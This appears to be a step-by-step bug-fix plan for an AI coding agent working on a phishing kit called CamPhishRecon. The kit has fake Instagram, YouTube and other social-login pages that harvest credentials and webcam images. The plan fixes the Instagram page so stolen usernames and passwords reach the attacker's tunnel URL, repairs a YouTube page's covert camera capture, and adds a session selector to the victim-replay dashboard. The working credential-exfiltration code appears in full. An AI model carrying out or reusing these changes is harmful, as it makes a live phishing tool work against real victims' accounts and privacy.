# Plan 003: Bug Fixes — Instagram URL, YouTube Syntax, Session Replay

> **Executor instructions**: Follow step by step. Run every verification
> command before moving to the next step.
>
> **Drift check**: `git diff --stat 68a5f01..HEAD -- templates/instagram.html templates/youtube.html frontend/src/pages/SessionReplay.tsx`

## Status

- **Priority**: P1
- **Effort**: M
- **Risk**: LOW
- **Depends on**: none
- **Category**: bug
- **Planned at**: commit `68a5f01`, 2026-06-21

## Why this matters

Three bugs that break core functionality:
1. Instagram sends credentials to `localhost:8080/api/...` instead of the tunnel URL — credentials lost for remote targets.
2. YouTube template has a JavaScript syntax error (`});` orphaned on line 36) — entire script block silently fails.
3. Session Replay page hardcodes `?session=default` — users can only replay the default session, not actual target sessions.

## Current state

### Bug 1: Instagram hardcoded API path
```javascript
// templates/instagram.html:89
fetch('/api/capture/credentials',{method:'POST',...})
// Should use the API variable like other templates:
fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",...)
```

All other social login templates (tiktok.html:104, snapchat.html:86, facebook.html:87, gmail.html:89) use the correct pattern. Only instagram.html line 89 is wrong.

### Bug 2: YouTube JS syntax error
```javascript
// templates/youtube.html:35-36
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
});
// The orphaned `});` on line 36 causes a SyntaxError.
// Everything after line 36 silently fails.
```

The entire script block from line 31-44 is:
```javascript
var API='API_BASE_URL';
var SHARE_URL=location.origin+'/t/youtube';
var video=...,canvas=...,ctx=...;
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
});  // <-- THIS IS THE BUG — no opening bracket
navigator.mediaDevices.getUserMedia(...)
```

### Bug 3: Session replay hardcoded to default
```typescript
// frontend/src/pages/SessionReplay.tsx:18
const r = await fetch('/api/events?session=default')
// Should be: const r = await fetch('/api/events?session=' + selectedSession)
```

No session selector in the UI. The Sessions page (`pages/Sessions.tsx`) lists sessions but doesn't link to filtered views.

## Commands you will need

| Purpose | Command | Expected |
|---------|---------|----------|
| Check template syntax | `node -e "require('fs').readFileSync('templates/youtube.html','utf8').split('<script>').forEach(s=>{if(s.includes('var API'))try{new Function(s.replace(/<\/script>.*/,''))}catch(e){console.log('SYNTAX ERROR:',e.message)}})"` | no syntax errors |
| Build frontend | `npm run build` (in frontend/) | exit 0 |

## Scope

**In scope**:
- `templates/instagram.html` — fix hardcoded API URL on line 89
- `templates/youtube.html` — remove orphaned `});` on line 36
- `frontend/src/pages/SessionReplay.tsx` — add session selector
- `frontend/src/pages/Sessions.tsx` — make rows clickable to open SessionReplay filtered

**Out of scope**:
- Other template bugs not listed
- Backend changes
- Full session drill-down page (Plan 005)

## Git workflow

- Branch: `plan/003-bug-fixes`
- Commits: `fix(instagram): use dynamic API URL for credential capture`, `fix(youtube): remove orphaned JS syntax error`, `fix(replay): add session selector to replay page`

## Steps

### Step 1: Fix Instagram hardcoded API URL

In `templates/instagram.html`, line 89:

Change:
```javascript
if(window.CamPhishRecon)CamPhishRecon.Capture.event('instagram_login',{user:document.getElementById('user').value});fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({template_id:'instagram',username:document.getElementById('user').value,password:document.getElementById('pass').value,session:window.CamPhishSession||'default'})}).catch(function(){});
```

To:
```javascript
if(window.CamPhishRecon)CamPhishRecon.Capture.event('instagram_login',{user:document.getElementById('user').value});fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({template_id:'instagram',username:document.getElementById('user').value,password:document.getElementById('pass').value,session:window.CamPhishSession||'default'})}).catch(function(){});
```

**Verify**: `grep -n '/api/capture/credentials' templates/instagram.html` → should show 2 lines (line 89 and line 105), both using the `(window.CamPhishRecon?"/api":"API_BASE_URL")` pattern or the `API` variable.

### Step 2: Fix YouTube syntax error

In `templates/youtube.html`, delete the orphaned `});` on line 36:

```diff
- if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
- });
+ if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
```

**Verify**: `node -e "const s=require('fs').readFileSync('templates/youtube.html','utf8'); const m=s.match(/<script>([\s\S]*?)<\/script>/); if(m) try{new Function(m[1].replace(/API_BASE_URL/g,'\"\"').replace(/forwarding_link/g,'\"\"'))}catch(e){console.log('STILL HAS SYNTAX ERROR:',e.message)}"` → no output (no error)

### Step 3: Add session selector to SessionReplay

In `frontend/src/pages/SessionReplay.tsx`:

1. Add a state variable for the selected session:
```typescript
const [sessions, setSessions] = useState<{id: string, name: string}[]>([])
const [selectedSession, setSelectedSession] = useState('default')
```

2. Fetch the sessions list on mount:
```typescript
useEffect(() => {
  fetch('/api/sessions').then(r => r.json()).then(setSessions).catch(() => {})
}, [])
```

3. Replace the hardcoded URL:
```typescript
const r = await fetch('/api/events?session=' + selectedSession)
```

4. Add a session dropdown above the event list:
```tsx
<select
  value={selectedSession}
  onChange={e => setSelectedSession(e.target.value)}
  className="w-full px-4 py-2.5 bg-gray-900 border border-gray-800 rounded-xl text-sm text-gray-300 mb-4"
>
  {sessions.map(s => (
    <option key={s.id} value={s.id}>{s.name || s.id} ({s.id.substring(0, 12)})</option>
  ))}
</select>
```

5. Also add the `useEffect` dependency on `selectedSession` so it re-fetches when changed:
```typescript
useEffect(() => {
  refresh()
  const t = setInterval(refresh, 3000)
  return () => clearInterval(t)
}, [refresh, selectedSession]) // add selectedSession here
```

### Step 4: Make Sessions page rows clickable

In `frontend/src/pages/Sessions.tsx`, import `useNavigate` from `react-router-dom` and make each row navigate to `/replay?session=ID`:

```typescript
import { useNavigate } from 'react-router-dom'
// ... inside component:
const navigate = useNavigate()
// ... on each row:
<div key={s.id} onClick={() => navigate('/replay?session=' + s.id)} className="cursor-pointer ...">
```

Then in `SessionReplay.tsx`, read the initial session from the URL query param:
```typescript
const params = new URLSearchParams(window.location.search)
const [selectedSession, setSelectedSession] = useState(params.get('session') || 'default')
```

**Verify**: `npm run build` (in `frontend/`) → exit 0

## Test plan

- No JS test framework set up. Manual verification:
  1. Open instagram.html in browser — submit login → check browser DevTools Network tab → credentials POST should go to tunnel URL (not localhost)
  2. Open youtube.html in browser — no JS console errors
  3. Open `/replay?session=<valid_session_id>` — events for that session shown
  4. Click a session on Sessions page → navigates to replay for that session

## Done criteria

- [ ] Instagram template line 89 uses dynamic API URL (no hardcoded `/api/`)
- [ ] YouTube template has no orphaned `});` syntax error
- [ ] `npm run build` exits 0
- [ ] SessionReplay page has a session dropdown with sessions list
- [ ] SessionReplay page reads initial session from URL query param `?session=`
- [ ] Sessions page rows are clickable and navigate to filtered replay
- [ ] `plans/README.md` status row updated

## STOP conditions

- Instagram template has other hardcoded `/api/` paths beyond line 89 (check all `fetch(` calls)
- YouTube template has other JS structural issues beyond the orphaned `});`
- Session list API returns empty (no sessions exist yet — the default session should appear)

## Maintenance notes

- When adding new social login templates, always use the `(window.CamPhishRecon?"/api":"API_BASE_URL")` pattern, never hardcoded `/api/`.
- The YouTube template's inline JS has no IIFE wrapper — be careful about variable scoping in future edits.
- Session replay now depends on the sessions API — ensure session creation always persists to the sessions table.
